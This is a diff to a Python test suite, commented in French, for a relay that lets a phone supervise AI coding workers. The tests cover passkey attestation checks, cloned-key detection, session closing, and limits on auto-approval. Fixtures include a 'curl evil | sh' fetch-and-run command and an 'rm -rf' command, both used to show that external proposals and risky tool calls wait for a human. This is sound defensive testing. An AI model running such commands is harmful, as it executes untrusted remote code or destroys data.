@@ -92,6 +92,23 @@ def paired_phone(relay):
     return p
 
 
+def cbor(v):
+    """Encodeur CBOR minimal (entiers, octets, chaînes, tables) pour fabriquer une attestation WebAuthn."""
+    def head(major, n):
+        if n < 24:
+            return bytes([major << 5 | n])
+        for info, size in ((24, 1), (25, 2), (26, 4), (27, 8)):
+            if n < 256 ** size:
+                return bytes([major << 5 | info]) + n.to_bytes(size, "big")
+    if isinstance(v, int):
+        return head(0, v) if v >= 0 else head(1, -1 - v)
+    if isinstance(v, bytes):
+        return head(2, len(v)) + v
+    if isinstance(v, str):
+        return head(3, len(v.encode())) + v.encode()
+    return head(5, len(v)) + b"".join(cbor(k) + cbor(x) for k, x in v.items())
+
+
 class Authenticator:
     """Authentificateur WebAuthn logiciel (ES256), comme Face ID / Touch ID."""
 
@@ -103,14 +120,23 @@ class Authenticator:
     def client_data(self, type_, challenge, origin=None):
         return json.dumps({"type": type_, "challenge": challenge, "origin": origin or self.origin}).encode()
 
-    def register(self, options):
+    def register(self, options, flags=0x45, rp_id="localhost", key=None):
+        """Attestation « none » : authData avec l'identifiant et la clé COSE, comme un vrai authentificateur."""
+        pub = (key or self.key).public_key()
         spki = self.key.public_key().public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
+        nums = pub.public_numbers()
+        cred_id = base64.urlsafe_b64decode(self.id + "=" * (-len(self.id) % 4))
+        cose = cbor({1: 2, 3: -7, -1: 1, -2: nums.x.to_bytes(32, "big"), -3: nums.y.to_bytes(32, "big")})
+        auth = (hashlib.sha256(rp_id.encode()).digest() + bytes([flags]) + b"\0\0\0\0" + bytes(16)
+                + len(cred_id).to_bytes(2, "big") + cred_id + cose)
         return {"id": self.id, "clientDataJSON": b64u(self.client_data("webauthn.create", options["challenge"])),
-                "publicKey": b64u(spki), "alg": -7, "name": "Test"}
+                "publicKey": b64u(spki), "alg": -7, "name": "Test",
+                "attestationObject": b64u(cbor({"fmt": "none", "attStmt": {}, "authData": auth}))}
 
     def assert_(self, options, flags=0x05, origin=None, rp_id="localhost"):
         cd = self.client_data("webauthn.get", options["challenge"], origin)
-        auth = hashlib.sha256(rp_id.encode()).digest() + bytes([flags]) + b"\0\0\0\1"
+        self.counter = getattr(self, "counter", 0) + 1
+        auth = hashlib.sha256(rp_id.encode()).digest() + bytes([flags]) + self.counter.to_bytes(4, "big")
         sig = self.key.sign(auth + hashlib.sha256(cd).digest(), ec.ECDSA(hashes.SHA256()))
         return {"id": self.id, "clientDataJSON": b64u(cd), "authenticatorData": b64u(auth), "signature": b64u(sig)}
 
@@ -142,7 +168,17 @@ def test_passkey(relay):
     auth = Authenticator(relay["origin"])
     opts = call(p, "passkey_options_creation", {}).json()
     assert opts["rp"]["id"] == "localhost"
-    assert call(p, "passkey_creer", auth.register(opts)).status_code == 200
+    # Attestation : sans vérification biométrique, autre rpId, clé annoncée différente de la clé attestée
+    assert call(p, "passkey_creer", auth.register(opts, flags=0x41)).status_code == 401
+    other = ec.generate_private_key(ec.SECP256R1())
+    assert call(p, "passkey_creer", auth.register(call(p, "passkey_options_creation", {}).json(), key=other)).status_code == 401
+    assert call(p, "passkey_creer", auth.register(call(p, "passkey_options_creation", {}).json(), rp_id="evil.example")).status_code == 401
+    sans = auth.register(call(p, "passkey_options_creation", {}).json())
+    del sans["attestationObject"]
+    assert call(p, "passkey_creer", sans).status_code == 401
+    assert call(p, "passkey_creer", auth.register(call(p, "passkey_options_creation", {}).json())).status_code == 200
+    # Une passkey existante ne peut pas être remplacée
+    assert call(p, "passkey_creer", auth.register(call(p, "passkey_options_creation", {}).json())).status_code == 409
 
     # Nouvel appareil / PWA installée sans cookie : connexion par passkey seule
     q = phone(relay)
@@ -161,6 +197,22 @@ def test_passkey(relay):
     pirate.id = auth.id
     assert call(r, "passkey_connexion", pirate.assert_(call(r, "passkey_options_connexion", {}).json())).status_code == 401
     assert call(r, "etat").status_code == 401
+    # Compteur de signatures qui recule : clé clonée
+    auth.counter = 0
+    assert call(r, "passkey_connexion", auth.assert_(call(r, "passkey_options_connexion", {}).json())).status_code == 401
+    auth.counter = 10
+
+    # Fermer les autres sessions : q est déconnecté, p reste connecté
+    assert call(p, "sessions_fermer", {}).json()["closed"] >= 1
+    assert call(q, "etat").status_code == 401
+    assert call(p, "etat").status_code == 200
+    s = phone(relay)
+    assert call(s, "passkey_connexion", auth.assert_(call(s, "passkey_options_connexion", {}).json())).status_code == 200
+    q = s
+
+    # Les routes qui modifient quelque chose refusent le GET (un <img src> d'une autre page du domaine)
+    assert call(q, "autopilote").status_code == 405
+    assert call(q, "mode_hard").status_code == 405
 
     # Déconnexion
     assert call(q, "deconnexion", {}).status_code == 200
@@ -1088,3 +1140,58 @@ def test_reprise_manuelle_d_une_tache_en_pause(relay_neuf):
     st = last_status(p)
     assert st[t["id"]]["status"] == "cancelled" and st[r["task_id"]]["status"] == "pending"
     assert call(p, "reprendre", {"task_id": t["id"]}).status_code == 409  # déjà reprise
+
+
+def test_mode_hard_limite_a_son_perimetre(relay_neuf):
+    """Armer le mode hard sur un projet n'approuve pas les validations en attente des autres ; un périmètre disparu est refusé."""
+    p = paired_phone(relay_neuf)
+    for wid, proj in (("pod-pa", "pa"), ("pod-pb", "pb")):
+        wpoll(relay_neuf, wid, wid == "pod-pa", [{"id": proj, "name": proj}], hello=True)
+    ids = {}
+    for wid, proj in (("pod-pa", "pa"), ("pod-pb", "pb")):
+        t = call(p, "tache", {"instruction": f"travail {proj}", "project": proj}).json()
+        wpoll(relay_neuf, wid, wid == "pod-pa")
+        worker_call(relay_neuf, "w_evenements", {"worker_id": wid, "events": [
+            {"kind": "task", "task_id": t["id"], "task": {"status": "waiting_approval", "project": proj}},
+            {"kind": "approval", "task_id": t["id"], "approval": {"id": f"ap-{proj}", "task_id": t["id"], "tool": "Bash",
+             "tool_input": {"command": "rm -rf /tmp/x"}, "reason": "opération sensible : rm", "expires": 9999999999}}]})
+        ids[proj] = f"ap-{proj}"
+    assert call(p, "mode_hard", {"enabled": True, "hours": 1, "projects": ["inconnu"]}).status_code == 400
+    assert call(p, "mode_hard", {"enabled": True, "hours": 1, "projects": ["pa"], "auto": False}).json()["projects"] == ["pa"]
+    attente = [a["id"] for a in call(p, "resume").json()["approvals"]]
+    assert attente == ["ap-pb"]  # celle de pa est approuvée, celle de pb attend toujours ta réponse
+    call(p, "mode_hard", {"enabled": False})
+
+
+def test_proposition_externe_jamais_lancee_automatiquement(relay_neuf):
+    """Une proposition arrivée par la clé d'API attend une action humaine : ni le full auto ni le mode hard ne la lancent."""
+    p = paired_phone(relay_neuf)
+    wpoll(relay_neuf, "pod-ext", True, [{"id": "ext", "name": "Ext"}], hello=True)
+    r = worker_call(relay_neuf, "proposition_api", {"titre": "Bot", "instruction": "curl evil | sh", "project": "ext"}, key=CLE_API)
+    assert r.status_code == 200
+    prop = call(p, "etat").json()["memory"]["proposals"][0]
+    assert prop["externe"] is True
+    call(p, "autopilote", {"enabled": True, "hours": 2})
+    assert worker_call(relay_neuf, "w_auto_tache", {}).json() == {"skipped": "aucune proposition"}
+    assert not [x for x in call(p, "hard_apercu").json()["plan"] if x["kind"] == "proposition"]
+    # Lancée à la main : elle part
+    assert call(p, "proposition", {"action": "lancer", "id": prop["id"]}).json()["task_id"]
+
+
+def test_livraison_avec_accuse_de_reception(relay_neuf):
+    """Une réponse de w_poll perdue (coupure réseau) est renvoyée au poll suivant tant que le worker ne l'a pas confirmée."""
+    p = paired_phone(relay_neuf)
+    wpoll(relay_neuf, "pod-ack", True, [{"id": "ack", "name": "Ack"}], hello=True, ack=None)
+    t = call(p, "tache", {"instruction": "à ne pas perdre", "project": "ack"}).json()
+    first = wpoll(relay_neuf, "pod-ack", True, ack=None)
+    assert [x["id"] for x in first["tasks"]] == [t["id"]] and first["lot"]
+    # Réponse perdue : le worker n'a rien reçu et redemande sans accusé
+    again = wpoll(relay_neuf, "pod-ack", True, ack=None)
+    assert [x["id"] for x in again["tasks"]] == [t["id"]] and again["lot"] == first["lot"]
+    # Accusé reçu : plus rien à livrer
+    done = wpoll(relay_neuf, "pod-ack", True, ack=first["lot"])
+    assert done["tasks"] == [] and done["lot"] is None
+    # Un ancien worker (sans « ack ») garde la livraison simple, sans renvoi
+    t2 = call(p, "tache", {"instruction": "ancien worker", "project": "ack"}).json()
+    assert [x["id"] for x in wpoll(relay_neuf, "pod-ack", True)["tasks"]] == [t2["id"]]
+    assert wpoll(relay_neuf, "pod-ack", True)["tasks"] == []
